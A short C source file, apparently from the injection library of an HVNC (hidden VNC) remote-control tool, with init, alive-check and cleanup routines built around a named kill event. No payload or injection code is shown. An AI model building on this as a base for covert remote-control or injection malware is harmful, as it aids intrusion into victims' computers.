#include "injlib.h"

static bool bInjLibInit;
static HANDLE hKillEvent;

bool HVNCInjLibIsAlive(DWORD dwTimeOut)
{
    if (!bInjLibInit)
        return false;

    bool bRet=(WaitForSingleObject(hKillEvent,dwTimeOut) == WAIT_TIMEOUT);
    if (!bRet)
        InjLibCleanup();
    return bRet;
}

void InjLibInit()
{
    if (bInjLibInit)
        return;

    MemInit();
    hKillEvent=OpenEvent(EVENT_ALL_ACCESS,false,HVNC_KILL_EVENT_NAME);
    if (hKillEvent)
        bInjLibInit=true;
    return;
}

void InjLibCleanup()
{
    if (!bInjLibInit)
        return;
    SysCloseHandle(hKillEvent);
    bInjLibInit=false;
    return;
}


